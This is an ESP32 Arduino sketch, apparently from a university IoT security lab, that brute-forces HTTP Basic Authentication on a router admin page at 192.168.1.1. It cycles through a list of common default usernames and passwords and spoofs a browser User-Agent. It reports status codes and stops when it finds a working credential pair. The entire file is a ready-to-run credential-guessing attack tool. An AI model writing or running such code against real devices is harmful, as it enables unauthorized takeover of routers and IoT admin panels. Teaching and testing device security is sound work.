/*
 * ESP32 HTTP Basic Auth Brute Forcer
 * Category: Network Attacks
 *
 * Dictionary attack on HTTP Basic Authentication. Common on
 * IoT device admin panels and routers. Reports HTTP status
 * codes per attempt and halts on first success (200/302).
 *
 * Board  : ESP32 DevKit V1
 * Library: WiFi.h, HTTPClient.h, base64.h (all built-in)
 * KLS GIT Belagavi — IoT Security Lab | Authorized use only.
 */
#include <WiFi.h>
#include <HTTPClient.h>
#include <base64.h>

#define WIFI_SSID "YourWiFi"
#define WIFI_PASS "YourPassword"
#define TARGET    "http://192.168.1.1/admin"

const char* U[]={"admin","root","user","administrator","guest","support"};
const char* P[]={"admin","root","password","123456","1234","admin123","","default","toor"};
const int UL=6, PL=9;

WiFiClient net; HTTPClient http;

int tryAuth(const char* u,const char* p){
  http.begin(net,TARGET);
  http.addHeader("Authorization","Basic "+base64::encode(String(u)+":"+p));
  http.addHeader("User-Agent","Mozilla/5.0");
  int code=http.GET(); http.end(); return code;
}

void setup(){
  Serial.begin(115200);
  WiFi.begin(WIFI_SSID,WIFI_PASS);
  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
  Serial.printf("\n[*] HTTP BasicAuth -> %s\n\n",TARGET);
  Serial.println(" USER            | PASS         | HTTP");
  Serial.println("-----------------+--------------+------");
  for(int u=0;u<UL;u++){
    for(int p=0;p<PL;p++){
      Serial.printf(" %-15s | %-12s | ",U[u],P[p]);
      int code=tryAuth(U[u],P[p]);
      Serial.printf("%d\n",code);
      if(code==200||code==302||code==301){
        Serial.printf("\n[+] SUCCESS: %s / %s (HTTP %d)\n",U[u],P[p],code);
        return;
      }
      delay(300);
    }
  }
  Serial.println("\n[-] All combinations exhausted.");
}
void loop(){}
